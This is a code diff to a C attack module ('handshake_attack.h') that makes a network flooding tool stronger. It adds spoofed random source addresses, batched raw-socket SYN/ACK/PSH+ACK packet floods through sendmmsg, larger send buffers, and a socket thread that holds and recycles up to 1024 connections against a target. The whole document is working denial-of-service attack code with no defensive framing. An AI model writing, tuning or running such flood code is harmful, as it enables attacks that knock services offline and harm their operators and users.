@@ -17,9 +17,10 @@
 #include "handshake_attack.h"
 #include "../headers/protocol.h"
 
-#define MAX_CONNECTIONS 512
-#define CONNECT_TIMEOUT_MS 50
+#define MAX_CONNECTIONS 1024
+#define CONNECT_TIMEOUT_MS 30
 #define BURST_SIZE 64
+#define RAW_BATCH 128
 
 typedef struct {
     int fd;
@@ -27,11 +28,20 @@ typedef struct {
     time_t created;
 } conn_slot;
 
-static uint32_t rand_ip(void) {
-    return (rand() % 223 + 1) << 24 |
-           (rand() % 255) << 16 |
-           (rand() % 255) << 8 |
-           (rand() % 254 + 1);
+static inline uint64_t xorshift64(uint64_t *s) {
+    uint64_t x = *s;
+    x ^= x << 13;
+    x ^= x >> 7;
+    x ^= x << 17;
+    return *s = x;
+}
+
+static inline uint32_t rand_ip_fast(uint64_t *rng) {
+    uint64_t r = xorshift64(rng);
+    return ((r % 223 + 1) << 24) |
+           (((r >> 8) % 255) << 16) |
+           (((r >> 16) % 255) << 8) |
+           (((r >> 24) % 254) + 1);
 }
 
 static uint16_t tcp_checksum(struct iphdr* ip, struct tcphdr* tcp, int tcp_len) {
@@ -84,8 +94,11 @@ static void* raw_flood_thread(void* arg) {
     int opt = 1;
     setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
 
-    int sndbuf = 4 * 1024 * 1024;
+    int sndbuf = 8 * 1024 * 1024;
     setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+
+    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 16) ^ (uintptr_t)&fd;
+    if (rng_state == 0) rng_state = 0xDEADBEEFCAFEBABEULL;
 
     attack_option* opt_psize = find_option(params, OPT_PSIZE);
     uint16_t psize = opt_psize ? get_option_u16(opt_psize) : 0;
@@ -94,68 +107,99 @@ static void* raw_flood_thread(void* arg) {
     size_t tcp_opts_len = 20;
     size_t total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + tcp_opts_len + psize;
 
-    char* packet = (char*)malloc(total_len);
-    if (!packet) {
+    // Pre-allocate batch of packets for sendmmsg
+    // Each packet in the batch gets 3 sends (SYN, ACK, PSH+ACK), so we need
+    // RAW_BATCH * 3 messages. But since we modify flags in-place, we allocate
+    // RAW_BATCH independent packet buffers and send them in 3 passes.
+    char (*packets)[600] = malloc(RAW_BATCH * 600);
+    if (!packets) {
         close(fd);
         return NULL;
     }
-    memset(packet, 0, total_len);
-
-    struct iphdr* ip = (struct iphdr*)packet;
-    struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
-    uint8_t* tcp_opts = (uint8_t*)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
-    uint8_t* payload = tcp_opts + tcp_opts_len;
-
-    tcp_opts[0] = 2; tcp_opts[1] = 4; tcp_opts[2] = 0x05; tcp_opts[3] = 0xB4;
-    tcp_opts[4] = 1;
-    tcp_opts[5] = 3; tcp_opts[6] = 3; tcp_opts[7] = 8;
-    tcp_opts[8] = 1;
-    tcp_opts[9] = 1;
-    tcp_opts[10] = 8; tcp_opts[11] = 10;
-    uint32_t ts = htonl(time(NULL));
-    memcpy(tcp_opts + 12, &ts, 4);
-    memset(tcp_opts + 16, 0, 4);
-
-    if (psize > 0) {
-        for (uint16_t i = 0; i < psize; i++) {
-            payload[i] = rand() & 0xFF;
-        }
-    }
-
-    ip->version = 4;
-    ip->ihl = 5;
-    ip->tos = 0;
-    ip->tot_len = htons(total_len);
-    ip->frag_off = 0;
-    ip->ttl = 64;
-    ip->protocol = IPPROTO_TCP;
-    ip->daddr = params->target_addr.sin_addr.s_addr;
-
-    tcp->dest = params->target_addr.sin_port;
-    tcp->doff = (sizeof(struct tcphdr) + tcp_opts_len) / 4;
-    tcp->window = htons(64240);
-    tcp->urg_ptr = 0;
 
     struct sockaddr_in dest;
     memset(&dest, 0, sizeof(dest));
     dest.sin_family = AF_INET;
-    dest.sin_addr.s_addr = ip->daddr;
+    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;
+
+    // Set up sendmmsg structures
+    struct mmsghdr msgs[RAW_BATCH];
+    struct iovec iovs[RAW_BATCH];
+
+    for (int i = 0; i < RAW_BATCH; i++) {
+        iovs[i].iov_base = packets[i];
+        iovs[i].iov_len  = total_len;
+
+        msgs[i].msg_hdr.msg_name       = &dest;
+        msgs[i].msg_hdr.msg_namelen    = sizeof(dest);
+        msgs[i].msg_hdr.msg_iov        = &iovs[i];
+        msgs[i].msg_hdr.msg_iovlen     = 1;
+        msgs[i].msg_hdr.msg_control    = NULL;
+        msgs[i].msg_hdr.msg_controllen = 0;
+        msgs[i].msg_hdr.msg_flags      = 0;
+        msgs[i].msg_len = 0;
+    }
+
+    // Initialize all packet buffers with common fields
+    for (int i = 0; i < RAW_BATCH; i++) {
+        memset(packets[i], 0, total_len);
+
+        struct iphdr* ip = (struct iphdr*)packets[i];
+        struct tcphdr* tcp = (struct tcphdr*)(packets[i] + sizeof(struct iphdr));
+        uint8_t* tcp_opts = (uint8_t*)(packets[i] + sizeof(struct iphdr) + sizeof(struct tcphdr));
+        uint8_t* payload = tcp_opts + tcp_opts_len;
+
+        // TCP options: MSS, Window Scale, Timestamps
+        tcp_opts[0] = 2; tcp_opts[1] = 4; tcp_opts[2] = 0x05; tcp_opts[3] = 0xB4;
+        tcp_opts[4] = 1;
+        tcp_opts[5] = 3; tcp_opts[6] = 3; tcp_opts[7] = 8;
+        tcp_opts[8] = 1;
+        tcp_opts[9] = 1;
+        tcp_opts[10] = 8; tcp_opts[11] = 10;
+        uint32_t ts = htonl(time(NULL));
+        memcpy(tcp_opts + 12, &ts, 4);
+        memset(tcp_opts + 16, 0, 4);
+
+        if (psize > 0) {
+            for (uint16_t p = 0; p < psize; p++) {
+                payload[p] = xorshift64(&rng_state) & 0xFF;
+            }
+        }
+
+        ip->version = 4;
+        ip->ihl = 5;
+        ip->tos = 0;
+        ip->tot_len = htons(total_len);
+        ip->frag_off = 0;
+        ip->ttl = 64;
+        ip->protocol = IPPROTO_TCP;
+        ip->daddr = params->target_addr.sin_addr.s_addr;
+
+        tcp->dest = params->target_addr.sin_port;
+        tcp->doff = (sizeof(struct tcphdr) + tcp_opts_len) / 4;
+        tcp->window = htons(64240);
+        tcp->urg_ptr = 0;
+    }
 
     time_t end_time = time(NULL) + params->duration;
-    uint32_t seq_base = rand();
+    uint32_t seq_base = (uint32_t)xorshift64(&rng_state);
     uint64_t iter = 0;
-
-    srand(time(NULL) ^ getpid() ^ (uintptr_t)&fd);
 
     while (params->active) {
         if ((++iter & 0xFF) == 0 && time(NULL) >= end_time) break;
-        for (int burst = 0; burst < 256 && params->active; burst++) {
-            ip->id = htons(rand() & 0xFFFF);
-            ip->saddr = rand_ip();
+
+        // Fill batch with unique SYN packets
+        for (int i = 0; i < RAW_BATCH; i++) {
+            struct iphdr* ip = (struct iphdr*)packets[i];
+            struct tcphdr* tcp = (struct tcphdr*)(packets[i] + sizeof(struct iphdr));
+
+            uint64_t rv = xorshift64(&rng_state);
+            ip->id = htons(rv & 0xFFFF);
+            ip->saddr = rand_ip_fast(&rng_state);
             ip->check = 0;
             ip->check = ip_checksum(ip, sizeof(struct iphdr));
 
-            tcp->source = htons(1024 + (rand() % 64000));
+            tcp->source = htons(1024 + ((rv >> 16) % 64000));
             tcp->seq = htonl(seq_base++);
             tcp->ack_seq = 0;
 
@@ -167,29 +211,42 @@ static void* raw_flood_thread(void* arg) {
 
             tcp->check = 0;
             tcp->check = tcp_checksum(ip, tcp, sizeof(struct tcphdr) + tcp_opts_len + psize);
+        }
 
-            sendto(fd, packet, total_len, MSG_NOSIGNAL, (struct sockaddr*)&dest, sizeof(dest));
+        // Send batch of SYN packets
+        sendmmsg(fd, msgs, RAW_BATCH, MSG_NOSIGNAL);
+
+        // Convert to ACK packets and send batch
+        for (int i = 0; i < RAW_BATCH; i++) {
+            struct iphdr* ip = (struct iphdr*)packets[i];
+            struct tcphdr* tcp = (struct tcphdr*)(packets[i] + sizeof(struct iphdr));
 
             tcp->syn = 0;
             tcp->ack = 1;
-            tcp->ack_seq = htonl(rand());
+            tcp->ack_seq = htonl(xorshift64(&rng_state) & 0xFFFFFFFF);
 
             tcp->check = 0;
             tcp->check = tcp_checksum(ip, tcp, sizeof(struct tcphdr) + tcp_opts_len + psize);
+        }
 
-            sendto(fd, packet, total_len, MSG_NOSIGNAL, (struct sockaddr*)&dest, sizeof(dest));
+        sendmmsg(fd, msgs, RAW_BATCH, MSG_NOSIGNAL);
+
+        // Convert to PSH+ACK packets and send batch
+        for (int i = 0; i < RAW_BATCH; i++) {
+            struct iphdr* ip = (struct iphdr*)packets[i];
+            struct tcphdr* tcp = (struct tcphdr*)(packets[i] + sizeof(struct iphdr));
 
             tcp->psh = 1;
             tcp->seq = htonl(seq_base++);
 
             tcp->check = 0;
             tcp->check = tcp_checksum(ip, tcp, sizeof(struct tcphdr) + tcp_opts_len + psize);
-
-            sendto(fd, packet, total_len, MSG_NOSIGNAL, (struct sockaddr*)&dest, sizeof(dest));
         }
+
+        sendmmsg(fd, msgs, RAW_BATCH, MSG_NOSIGNAL);
     }
 
-    free(packet);
+    free(packets);
     close(fd);
     return NULL;
 }
@@ -209,6 +266,8 @@ static void* socket_flood_thread(void* arg) {
 
     while (params->active) {
         if ((++sock_iter & 0xF) == 0 && time(NULL) >= end_time) break;
+
+        // Open connections in bulk
         for (int i = 0; i < MAX_CONNECTIONS && params->active; i++) {
             if (slots[i].fd <= 0) {
                 int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
@@ -226,12 +285,14 @@ static void* socket_flood_thread(void* arg) {
         }
 
         struct pollfd pfds[MAX_CONNECTIONS];
+        int pfd_map[MAX_CONNECTIONS]; // map pollfd index -> slot index
         int nfds = 0;
 
         for (int i = 0; i < MAX_CONNECTIONS; i++) {
             if (slots[i].fd > 0) {
                 pfds[nfds].fd = slots[i].fd;
                 pfds[nfds].events = POLLOUT;
+                pfd_map[nfds] = i;
                 nfds++;
             }
         }
@@ -240,25 +301,40 @@ static void* socket_flood_thread(void* arg) {
             poll(pfds, nfds, CONNECT_TIMEOUT_MS);
         }
 
-        for (int i = 0; i < MAX_CONNECTIONS; i++) {
-            if (slots[i].fd > 0) {
-                time_t now = time(NULL);
-                if (now - slots[i].created > 1 || slots[i].state >= 3) {
+        // Process results and recycle aggressively
+        time_t now = time(NULL);
+        for (int j = 0; j < nfds; j++) {
+            int i = pfd_map[j];
+            if (slots[i].fd <= 0) continue;
+
+            // Recycle after shorter timeout or too many sends
+            if (now - slots[i].created > 0 || slots[i].state >= 2) {
+                close(slots[i].fd);
+                slots[i].fd = 0;
+                slots[i].state = 0;
+                continue;
+            }
+
+            if (pfds[j].revents & POLLOUT) {
+                int error = 0;
+                socklen_t elen = sizeof(error);
+                getsockopt(slots[i].fd, SOL_SOCKET, SO_ERROR, &error, &elen);
+
+                if (error == 0) {
+                    char data[64];
+                    memset(data, 'X', sizeof(data));
+                    send(slots[i].fd, data, sizeof(data), MSG_NOSIGNAL);
+                    slots[i].state++;
+                } else {
+                    // Connection failed, recycle immediately
                     close(slots[i].fd);
                     slots[i].fd = 0;
                     slots[i].state = 0;
-                } else {
-                    int error = 0;
-                    socklen_t len = sizeof(error);
-                    getsockopt(slots[i].fd, SOL_SOCKET, SO_ERROR, &error, &len);
-
-                    if (error == 0) {
-                        char data[64];
-                        memset(data, 'X', sizeof(data));
-                        send(slots[i].fd, data, sizeof(data), MSG_NOSIGNAL);
-                        slots[i].state++;
-                    }
                 }
+            } else if (pfds[j].revents & (POLLERR | POLLHUP)) {
+                close(slots[i].fd);
+                slots[i].fd = 0;
+                slots[i].state = 0;
             }
         }
     }
